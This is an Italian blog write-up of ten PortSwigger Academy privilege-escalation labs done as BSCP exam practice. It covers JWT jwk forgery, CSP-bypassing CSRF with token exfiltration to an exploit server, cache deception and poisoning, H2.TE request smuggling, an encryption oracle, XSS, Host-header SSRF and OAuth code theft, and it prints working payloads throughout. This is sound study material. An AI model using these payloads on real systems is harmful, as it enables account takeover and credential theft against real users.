---
layout: post
title: "Dieci Roll nel Secondo Step: La Seconda Prova Generale per l'Esame"
date: 2026-11-27
categories: [web-security, walkthrough]
tags: [portswigger, bscp, mystery-lab, burp-suite, jwt, csrf, web-cache-poisoning, http-request-smuggling, oauth, ssrf, host-header, broken-authentication]
excerpt: "Altri dieci lab di Mystery Pool in un'unica sessione, stavolta privilege escalation — e il momento che ha contato di più è stato capire che una Content-Security-Policy aveva bloccato l'esecuzione del mio script, non che la pagina l'avesse silenziosamente neutralizzato con l'encoding."
lang: it
page_id: ten-rolls-step-two
permalink: /posts/dieci-roll-nel-secondo-step/
---

Il primo payload mi è tornato indietro morto. `foo@example.com"><img src= onerror=alert(1)>`, piazzato in un campo email, riflesso nella pagina account — e non è successo niente. La reazione onesta è stata "escapato, si va avanti". Non era escapato. Era lì nel DOM, un vero tag `<img>`, inerte perché una Content-Security-Policy aveva appena detto al browser di ignorare ogni event handler inline sulla pagina. Sono due bug completamente diversi con due soluzioni completamente diverse, e per un paio di minuti stavo risolvendo quello sbagliato.

Questo è il test due di tre: altri dieci lab di [Mystery Pool]({% post_url 2026-10-04-mystery-pool-strumento %}) tirati uno dietro l'altro, senza saltarne uno, duplicati inclusi, stesse regole del [primo step]({% post_url 2026-11-25-dieci-roll-nel-primo-step %}). Stavolta è privilege escalation — lo stadio in cui il foothold esiste già e la domanda è quanto in là si possa spingere un account a bassi privilegi dentro l'account di qualcun altro.

## Le regole del test

Stessa impostazione dell'ultima volta: tutti i topic di privilege escalation del Mystery Pool spuntati, difficoltà Practitioner, dieci roll, nessuno saltato, duplicati contati come tutto il resto. Tempo totale: circa due ore, dall'inizio alla fine, per tutti e dieci. A differenza del primo test, stavolta nessun lab si è mangiato l'intera sessione — le due ore si sono distribuite abbastanza uniformemente tra ri-derivare filtri, leggere oracoli e inseguire header roll dopo roll, senza che nessun singolo lab diventasse uno stallo di venti minuti. Strumenti: Burp Scanner, Intruder, Repeater, Decoder, le estensioni JWT Editor e HTTP Request Smuggler, Param Miner, e il mio [cheatsheet BSCP](https://github.com/matteo-brandolino/bscp-exam-notes). Nessun write-up della community questa volta — ogni lab è stato identificato e risolto dalla richiesta/risposta che avevo davanti.

## Scoreboard

| # | Lab / topic | Ripetizione? | Esito |
|---|---|---|---|
| 1 | Bypass di autenticazione JWT via header `jwk` self-signed | No | Risolto |
| 2 | CSRF via injection di dangling-markup con `formaction`, XSS bloccata da CSP escalata in esfiltrazione del token | No | Risolto, un vicolo cieco (`<img onerror>`, scambiato per escaping) |
| 3 | Web cache deception sfruttando la normalizzazione del server di origine | No | Risolto |
| 4 | Response queue poisoning via smuggling H2.TE | No | Risolto, un vicolo cieco (probe HTTP/1.1 grezzo rifiutato — il front-end è solo HTTP/2) |
| 5 | Bypass di autenticazione via encryption oracle | No | Risolto |
| 6 | XSS riflessa con bypass del filtro su tag/evento (`<body onresize>`) | No | Risolto |
| 7 | SSRF basata sul routing via header Host | No | Risolto |
| 8 | Logica fallata nel cambio password (l'assenza di `current-password` salta il controllo) | No | Risolto, un vicolo cieco (lab sbagliato ipotizzato: brute-force via cambio password) |
| 9 | Web cache poisoning via header Host duplicato | No | Risolto |
| 10 | Account takeover OAuth via `redirect_uri` non validato | **Sì** (2026-11-18) | Risolto, riconosciuto all'istante |

## La sessione

### Roll 1 — Una chiave che il server non ha mai chiesto di vedere (bypass JWT via `jwk`)

Un JWT nel cookie `session`, header `alg: RS256` e un `kid`, payload `sub: wiener`. Uno scan mirato solo su quel punto di inserimento del cookie — non un crawl — ha segnalato subito **"JWT self-signed JWK header supported"**, confidenza certa.

Il bug: il server accetta una chiave pubblica incorporata direttamente nell'header `jwk` del token stesso e verifica la firma contro *quella* chiave, invece di cercare `kid` in un keystore fisso lato server. Se il server verifica una firma contro qualunque chiave gli passi tu, la firma smette di dimostrare alcunché.

Con l'estensione **JWT Editor**: genero una nuova coppia di chiavi RSA che il server non ha mai visto, modifico il token aggiungendo un header `jwk` che punta alla metà pubblica della nuova chiave, cambio `sub` in `administrator`, firmo con la chiave privata corrispondente tramite l'estensione. Mandato come cookie `session` su `GET /admin`, ha funzionato — il server non aveva nulla con cui confrontare la chiave incorporata se non se stesso. Stage 2, non interattivo, nessuna delivery necessaria — è interamente una conversazione tra l'attaccante e il server.

### Roll 2 — Il payload che non era morto, solo ammutolito (CSRF via dangling markup, bypass CSP)

Una feature di "aggiorna email", primo sospetto CSRF — lo Scanner non ha trovato nulla lì, normale; il CSRF richiede conferma manuale, non un hit automatico. Mi sposto su un'ipotesi XSS sullo stesso campo. `foo@example.com"><img src= onerror=alert(1)>` si riflette nella pagina account e l'alert non parte mai. Leggo questo come l'encoding che fa il suo lavoro e vado avanti — lettura sbagliata, costata qualche minuto prima che emergesse la vera causa: il markup non veniva affatto rimosso, era una Content-Security-Policy a rifiutarsi di eseguire qualunque event handler inline sulla pagina. Due modalità di fallimento diverse che dall'esterno sembrano identiche: un payload sparito, e un payload presente ma imbavagliato.

Chiarito questo, la soluzione è ovvia: smettere di provare a eseguire qualcosa. `<button formaction="..." formmethod="get">` è un controllo di form, non uno script — nessuna direttiva CSP lo blocca di default:

```
https://TARGET.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://EXPLOIT-SERVER.exploit-server.net/exploit" formmethod="get">Click me</button>
```

Iniettato dentro il form *reale* di cambio email della pagina (che ha già un campo nascosto col token CSRF), questo bottone sovrascrive dove va a finire il submit senza toccare nessuno degli altri campi. Un click manda l'intero form — token incluso — come GET all'exploit server. La CSP mi ha impedito di eseguire codice; non ha fatto nulla per impedirmi di aggiungere un nuovo modo di inviare un form già esistente.

Delivery in due stadi, stesso script sull'exploit server: la prima visita reindirizza la vittima all'URL craftato di `my-account` col bottone; il suo click fa trapelare il suo stesso token CSRF nel log dell'exploit server via query string; un secondo caricamento dello stesso script vede quel token già presente e invia automaticamente un form nascosto che cambia la sua email in `hacker@evil-user.net`.

```html
<body>
<script>
const academyFrontend = "https://TARGET.web-security-academy.net/";
const exploitServer = "https://EXPLOIT-SERVER.exploit-server.net/exploit";
const url = new URL(location);
const csrf = url.searchParams.get('csrf');
if (csrf) {
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');
    token.name = 'csrf'; token.value = csrf;
    email.name = 'email'; email.value = 'hacker@evil-user.net';
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email); form.append(token);
    document.documentElement.append(form);
    form.submit();
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```

Stage 2, interattivo (serve un click), delivery via exploit server.

### Roll 3 — Due lettori dello stesso URL, in disaccordo (web cache deception via normalizzazione dell'origine)

`/my-account` mostra una API key. Fuzzo il path con Intruder cercando un suffisso che risolva ancora alla pagina sensibile *e* che venga letto come statico da chi lo mette in cache. `/aaa/..%2fmy-account` — un `../` codificato — torna `200` con la chiave: il server di origine decodifica e risolve il dot-segment, collassando il prefisso finto e servendo `/my-account` come se fosse sempre stata quella la richiesta.

Separatamente, tutte le risorse statiche del sito vivono sotto `/resources/`, e le risposte sotto quel prefisso mostrano segni di caching. Unendo i due: `/resources/..%2fmy-account?wcd`. La cache vede `/resources/...` e mette in cache a vista, senza guardare oltre il prefisso. L'origine normalizza il `..%2f` e serve la vera pagina `/my-account` autenticata. Due componenti, due opinioni diverse su dove punti quell'URL, e il divario tra le due è l'intero bug.

```html
<script>document.location="https://TARGET.web-security-academy.net/resources/..%2fmy-account?wcd"</script>
```

La vittima carica questo, il suo browser (con la sua sessione) richiede il path craftato, la sua risposta autenticata finisce in cache sotto quel path. Richiedo lo stesso path senza alcuna sessione, e la cache mi restituisce la pagina della vittima, API key inclusa. Stage 2, interattivo (un caricamento di pagina dalla vittima), delivery via exploit server, non interattivo nel recupero da parte dell'attaccante.

### Roll 4 — Il 404 che dimostrava che stava funzionando (response queue poisoning via smuggling H2.TE)

Lo Scanner segnala HTTP request smuggling, confidenza solo **tentative** — il testo generico dell'advisory, nessuna variante confermata. La sua stessa proof-of-concept mostra sia `Transfer-Encoding: chunked` che `Content-Length` sulla stessa richiesta HTTP/2, che è la forma classica del desync ma non, da sola, prova di chi vince dove.

Provo il probe manuale da manuale per CL.TE come HTTP/1.1 grezzo in Repeater e ottengo un immediato `400 Bad Request`, `"Protocol error"`. Primo sospetto: un header `Host` malformato. Sistemo la formattazione, stesso errore. La causa vera: questo front-end parla solo HTTP/2 — una richiesta forzata in testo HTTP/1.1 letterale viene rifiutata prima ancora che l'ambiguità CL/TE venga parsata. I probe classici presuppongono un front-end HTTP/1.1; qui il desync vive proprio nel downgrade da HTTP/2 a HTTP/1.1, quindi il probe deve viaggiare *come* HTTP/2.

Passo all'estensione HTTP Request Smuggler col suo set di probe per HTTP/2, che conferma **"HTTP/2 TE desync v10a options"** — una variante con nome, non un'ipotesi. L'exploit è un singolo stream HTTP/2 che porta un header `Transfer-Encoding: chunked` che non dovrebbe mai poter portare, body `0\r\n\r\n` (un chunk chiuso immediatamente) seguito da una seconda richiesta completa appesa dopo:

```http
POST / HTTP/2
Host: TARGET.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: TARGET.web-security-academy.net
```

Il back-end, leggendo HTTP/1.1 puro sulla connessione riutilizzata, vede due richieste dove il front-end ne aveva aperto una sola. Mandata una volta, poi una seconda richiesta ordinaria torna con un `404` — non un errore, una *conferma*: quella seconda richiesta ha ricevuto la risposta destinata alla `GET /x` smuggled e inesistente, prova che la coda delle risposte è ora sfalsata esattamente di una posizione.

Da qui è puro timing: sparare la stessa richiesta avvelenante in loop con Intruder, filtrare il rumore noioso di 2xx/4xx/5xx, e aspettare che il traffico reale di qualcun altro, riutilizzando quella connessione, riceva la risposta destinata a lui invece che a te. Richiesta 110 della run:

```http
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=SqXrdAFP1OOTMwVVB95bLxTVoqPCnghe; Secure; HttpOnly; SameSite=None
```

Il redirect di login dell'amministratore, cookie di sessione incluso, consegnato a una richiesta che non aveva nulla a che fare con l'admin. Sostituito il cookie, entrato nel pannello admin, eliminato carlos. Stage 2, non interattivo — l'intera cattura sono richieste inviate dall'attaccante che sfruttano il normale riutilizzo delle connessioni, nessun click richiesto da nessuno.

### Roll 5 — Prendere in prestito il cifrario dalla feature sbagliata (bypass di autenticazione via encryption oracle)

Il login imposta un cookie `stay-logged-in`, chiaramente cifrato. La validazione email di un form commenti riflette il valore inviato in chiaro in caso di errore: `Invalid email address: test.com`. Postare un commento imposta anche un cookie `notification` — e le due feature, validazione commenti e persistenza del login, condividono lo stesso cifrario e la stessa chiave.

Quella condivisione funziona in entrambe le direzioni. Il cookie `notification` di `GET /post?postId=x`, alimentato con ciphertext arbitrario, lo decifra e riflette il plaintext nel messaggio d'errore — un oracolo di decifratura. Il campo `email` di `POST /post/comment`, alimentato con plaintext arbitrario, restituisce il ciphertext corrispondente nel `Set-Cookie` di `notification` — un oracolo di cifratura. Alimentare il vero cookie `stay-logged-in` nell'oracolo di decifratura rivela il formato: `wiener:1598530205184`, username e timestamp di scadenza, nient'altro.

Alimentare `administrator:<timestamp>` direttamente nell'oracolo di cifratura non dà un risultato pulito — il server antepone sempre una stringa fissa di 23 byte, `Invalid email address: `, prima di cifrare, e il cifrario lavora a blocchi di 16 byte. 23 non è un multiplo di 16; imbottire l'input scelto con 9 caratteri spazzatura prima rende il prefisso indesiderato esattamente 32 byte — due blocchi interi, rimovibili con pulizia in Decoder senza corrompere nulla dopo (tagliare l'output di un cifrario a blocchi altrove che su un confine di blocco trasforma tutto il resto in spazzatura). Tolti quei 32 byte sia dal test di decifratura che dal ciphertext forgiato vero, inserisco il risultato come `stay-logged-in`, e il server legge `administrator:<timestamp>` come se avesse generato lui stesso quel cookie. Entrato come administrator, eliminato carlos.

Stage 2, non interattivo — l'intero attacco sono due oracoli della stessa app, messi a conversare tra loro attraverso di me.

### Roll 6 — Un filtro con esattamente un buco (XSS riflessa, bypass su tag/evento)

Un payload canarino nel parametro `search` si riflette grezzo, non codificato — ma un filtro blocca chiaramente qualcosa, visto che i payload ovvi non passano. Invece di tirare a indovinare tag per tag, fuzzo prima con Intruder una wordlist di nomi di tag contro il parametro — `body` passa — poi una wordlist di event handler contro quel tag superstite — `onresize` passa. Tutto il resto di ovvio (`script`, `img`/`onerror`, `onload`) è presumibilmente bloccato.

`onresize` scatta solo quando il box dell'elemento cambia davvero dimensione, il che significa che la pagina di delivery deve fabbricare da sé quel resize:

```html
<iframe src="https://TARGET.web-security-academy.net/?search=%22%3E%3Cbody+onresize%3Dprint%28%29%3E" onload="this.style.width='100px'">
```

Il `">` iniettato rompe fuori dal contesto di riflessione di `search`, `<body onresize=print()>` pianta l'handler, e l'`onload` dell'iframe stesso ne restringe subito la larghezza — scatenando il resize, che scatena l'handler, che fa partire `print()` nel browser della vittima. Un bug dalla forma tipica dello stage 1, usato qui come payload di privilege escalation: bypass del filtro senza script più un evento scatenato dal contesto invece che da un gesto dell'utente. Interattivo (la vittima deve caricare la pagina), delivery via exploit server.

### Roll 7 — Un header che decide dove va davvero la richiesta (SSRF basata sul routing via header Host)

Lo Scanner segnala **External service interaction (HTTP)** su otto URL separati contemporaneamente — `/login`, `/my-account`, `/product`, diversi path di risorse statiche — che è il segnale che l'input vulnerabile non è specifico di una pagina. Era l'header `Host` stesso: sostituiscilo con un dominio Collaborator e il server fa una vera richiesta in uscita verso di esso su ogni pagina, non lo riflette solo in un link.

Quello è SSRF, ma la versione più utile qui è **routing-based**: mando una request-line con URL assoluto (mantenendo il dominio pubblico, consentito) con un `Host` disallineato che punta a un IP privato.

```http
GET https://TARGET.web-security-academy.net/admin HTTP/2
Host: 192.168.0.20
```

Front-end e back-end non sono d'accordo su quale dei due URL sia quello autorevole, e quel disaccordo instrada la richiesta verso infrastruttura interna a cui il browser non ha accesso diretto. Fuzzo `192.168.0.§1-255§` con Intruder in posizione `Host` finché uno risponde per `/admin` invece di un errore di connessione — `192.168.0.20`, che serve un vero pannello admin interno con un form di eliminazione utente, token CSRF incluso. Rigioco lo stesso trucco come `POST` con quel token e `username=carlos`. Stage 2, non interattivo, nessuna vittima in tutta la catena — ogni passo è una richiesta dell'attaccante verso lo stesso endpoint pubblico, solo con un header che cambia dove finisce davvero.

### Roll 8 — Il campo che conta solo se lo mandi (logica fallata nel cambio password)

Un form di cambio password, le solite credenziali. Primo istinto: è il lab del brute-force via cambio password, dove l'endpoint manca della protezione anti-lockout del form di login. Provo il brute-force sulla password corrente — niente, perché non era affatto quello il bug qui, solo una somiglianza superficiale con un altro lab già risolto in passato.

Il vero difetto: la richiesta porta `current-password`, `new-password-1`, `new-password-2`, e uno `username`. Rimuovere `current-password` del tutto — non svuotarlo, non manometterlo, semplicemente ometterlo — salta la verifica di netto:

```http
POST /my-account/change-password HTTP/2
Host: TARGET.web-security-academy.net

csrf=TOKEN&username=administrator&new-password-1=test&new-password-2=test
```

Il server l'ha accettata. La password dell'administrator è ora `test`, senza alcuna prova che quella vecchia fosse mai nota. Entrato, eliminato carlos. Stage 2, non interattivo. La lezione sotto il vicolo cieco: un controllo che gira solo quando il suo input è presente non è un controllo, è un suggerimento — e l'assenza di un campo può bypassare più pulitamente di qualunque valore ci metteresti dentro.

### Roll 9 — Quale Host vince? Il tag script ha creduto al secondo (web cache poisoning, header Host duplicato)

Una risposta con segni di caching negli header. Mandare **due** header `Host` nella stessa richiesta fa sì che il `<script src="//SECOND-HOST/js/tracking.js">` della pagina venga costruito col *secondo* valore — qualunque cosa costruisca quell'URL assoluto legge l'ultimo header Host che vede, mentre la cache davanti presumibilmente fa la key sul primo (o ignora la duplicazione come un singolo valore). Ospito un `tracking.js` malevolo sull'exploit server, imposto il secondo `Host` su quel dominio, e la risposta avvelenata — script di tracking ora puntato sull'attaccante — finisce in cache per tutti:

```http
GET / HTTP/1.1
Host: TARGET.web-security-academy.net
Host: EXPLOIT-SERVER.exploit-server.net
```

Una richiesta successiva normale, senza alcun trucco, lo conferma: `X-Cache: hit`, il tag script ora legge `src="//EXPLOIT-SERVER.exploit-server.net/resources/js/tracking.js"`. Ogni visitatore normale che carica la home page mentre quella entry di cache è viva ora scarica lo script dell'attaccante — lo stesso raggio d'azione di una XSS stored, consegnato attraverso l'infrastruttura invece che un campo di database. Un meccanismo dalla forma tipica dello stage 1 che qui fa il lavoro dello stage 2 (controllo totale dello script per ogni sessione di ogni visitatore), non interattivo una volta avvelenata la cache.

### Roll 10 — Quello che avevo già risolto (account takeover OAuth via `redirect_uri` non validato)

La richiesta di autorizzazione non aveva alcuna validazione su `redirect_uri`:

```http
GET /auth?client_id=CLIENT_ID&redirect_uri=example.com&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-TARGET.oauth-server.net
```

```http
HTTP/2 302 Found
Location: example.com?code=NTAQaQlIKLbMEScPVdthA5OPeSW2SrldR81UbOVujje
```

`redirect_uri` impostato su un dominio arbitrario, non controllato dall'attaccante, e il server ha comunque reindirizzato lì, codice di autorizzazione allegato. Avevo già risolto questa stessa forma di bug su questo blog — è una ripetizione genuina, stessa logica di lab di [un post di qualche settimana fa]({% post_url 2026-11-18-tre-roll-niente-a-schermo %}) — e si è visto dal cronometro: zero investigazione, dritto alla delivery.

```html
<iframe src="https://oauth-TARGET.oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://EXPLOIT-SERVER.exploit-server.net/&response_type=code&scope=openid%20profile%20email"></iframe>
```

La vittima carica questo, il suo browser viene reindirizzato all'exploit server col suo codice di autorizzazione allegato, il codice finisce nel log di accesso dell'exploit server. Intercetto il mio stesso tentativo di login al vero callback, sostituisco il mio codice con quello rubato, inoltro, entro come la vittima. Stage 2, interattivo, delivery via exploit server.

## Lo schema

Il filo conduttore della maggior parte di questi dieci stavolta non riguarda i cookie di identità — è uno strato più sotto. **Due componenti che dovrebbero essere d'accordo sullo stesso dato lo leggono invece in modo diverso, e il divario tra le due letture è l'exploit.** La cache e l'origine non sono d'accordo su dove punti un path normalizzato (roll 3) e su quale header `Host` sia quello vero (roll 9). Front-end e back-end non sono d'accordo su dove finisca davvero una richiesta HTTP/2 (roll 4). Un filtro blocca `onerror` ma non `onresize` — il filtro e l'attaccante non sono d'accordo su cosa conti come pericoloso, e solo uno dei due ha ragione (roll 6). La CSP di un browser e il suo DOM non sono d'accordo su se il markup iniettato sia pericoloso — la CSP blocca l'esecuzione, non l'iniezione, ed è una distinzione reale con dello spazio sfruttabile reale in mezzo (roll 2). Nessuno di questi bug vive in un singolo controllo rotto; vivono nella cucitura tra due cose che, prese singolarmente, erano entrambe ragionevoli.

Un secondo filo, più piccolo: **un passo di verifica che gira solo se gli dai qualcosa da verificare.** Il server del roll 1 controlla una firma contro qualunque chiave tu ci incorpori invece che contro un keystore fisso — forniscigli la tua chiave, e il "controllo" diventa una formalità che controlli tu. Il server del roll 8 controlla una password corrente solo se quel campo esiste nella richiesta — omettilo, e non resta nulla da far fallire. In entrambi i casi la soluzione a cui un developer arriva per primo — "verifica correttamente" — era tecnicamente presente. Quello che mancava era ancorare *contro cosa* viene verificato a qualcosa che l'attaccante non possa anche lui fornire.

## Esame e campo

**In esame**, i segnali più veloci di questa sessione: un'issue dello scanner che scatta su molti URL non correlati contemporaneamente (roll 7) significa che l'input vulnerabile è globale, non specifico di una pagina — controlla gli header prima dei parametri. Una coppia `Transfer-Encoding`/`Content-Length` su una richiesta HTTP/2 con confidenza solo "Tentative" significa confermare a mano prima di costruire la richiesta della fase di exploit — e se un probe classico HTTP/1.1 CL.TE/TE.CL torna un errore di protocollo immediato invece di un ritardo, sospetta un front-end solo-HTTP/2 prima di sospettare un refuso nel tuo stesso header. Un valore riflesso che "non si esegue" merita una domanda in più prima di arrenderti: codificato via, o solo bloccato dall'eseguirsi? Le due cose sembrano identiche nel browser e richiedono mosse successive completamente diverse. E una richiesta di cambio password o di azione sull'account con un campo sospettosamente chiamato "valore corrente" va testata eliminandola, non solo manomettendola — l'assenza di un parametro rompe più logica di quanto farà mai un valore sbagliato al suo posto.

**Sul campo**, questi dieci si collocano su punti genuinamente diversi della scala del raggio d'azione pur vivendo tutti tecnicamente sotto "privilege escalation". Il web cache poisoning (roll 9) e l'SSRF da Host duplicato (roll 7) scalano a ogni visitatore o ogni endpoint interno rispettivamente, con zero interazione della vittima; i bug JWT ed encryption-oracle (roll 1, 5) sono account takeover diretti e deterministici una volta rotto l'assunto crittografico; i roll CSRF, cache-deception, XSS e OAuth (2, 3, 6, 10) richiedono tutti che una vittima specifica carichi una pagina specifica, il che li restringe nella pratica senza renderli meno completi una volta che accade. La lezione difensiva condivisa: ogni volta che due sistemi — una cache e un'origine, un front-end e un back-end, un form commenti e un cookie di login — condividono infrastruttura o si fidano l'uno dell'output dell'altro, quella superficie condivisa merita una revisione propria, separata dalla logica di ciascun sistema preso singolarmente.

## Cosa viene dopo

Il terzo e ultimo test è l'ultimo stadio del BSCP: data exfiltration — XXE, SSRF usata per esfiltrare invece che per il routing, SSTI, path traversal, file upload, deserializzazione, OS command injection. Stessa regola dei primi due: dieci roll, senza saltarne uno, duplicati contati esattamente come capitano.

## Takeaways

- Un payload riflesso che non scatta potrebbe essere bloccato dall'esecuzione, non rimosso dalla pagina — Content-Security-Policy ed encoding dell'output sono due difese diverse, e solo una delle due impedisce al markup di atterrare del tutto.
- Quando una cache e un server di origine, o un front-end e un back-end, risolvono ciascuno a modo proprio lo stesso URL o la stessa richiesta, cerca il divario tra quelle due interpretazioni prima di cercare un bug in una delle due prese da sole.
- Un passo di verifica vale solo quanto ciò contro cui è ancorato — una firma controllata contro una chiave fornita dall'attaccante, o un controllo che gira solo quando il suo input è presente, falliscono allo stesso modo: fidandosi che sia l'attaccante a fornire la cosa da verificare.
- Quando un probe manuale classico (CL.TE, TE.CL) restituisce un errore di protocollo immediato invece del ritardo atteso, metti in dubbio l'assunto di protocollo dietro il probe prima di mettere in dubbio la sintassi della tua richiesta.
- Riconoscere un bug all'istante perché hai già risolto esattamente quella forma non è fortuna — è il ritorno reale di aver tirato la ruota abbastanza volte.

## Riferimenti utili

- [PortSwigger Web Security Academy: JWT](https://portswigger.net/web-security/jwt) · [CSRF](https://portswigger.net/web-security/csrf) · [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning) · [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling) · [Authentication](https://portswigger.net/web-security/authentication) · [HTTP Host header attacks](https://portswigger.net/web-security/host-header) · [OAuth authentication](https://portswigger.net/web-security/oauth) · [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) · [SSRF](https://portswigger.net/web-security/ssrf)
- [Tre roll, niente a schermo — la prima volta che è comparso questo bug OAuth]({% post_url 2026-11-18-tre-roll-niente-a-schermo %})
- [Dieci roll nel primo step — il primo test di questa serie]({% post_url 2026-11-25-dieci-roll-nel-primo-step %})
- [Mystery Pool]({% post_url 2026-10-04-mystery-pool-strumento %})
- [Le mie note per l'esame BSCP](https://github.com/matteo-brandolino/bscp-exam-notes)

*Tutte le tecniche mostrate sono state eseguite in un ambiente di laboratorio isolato. Attaccare sistemi che non possiedi o per cui non hai un'autorizzazione scritta è illegale nella maggior parte delle giurisdizioni.*
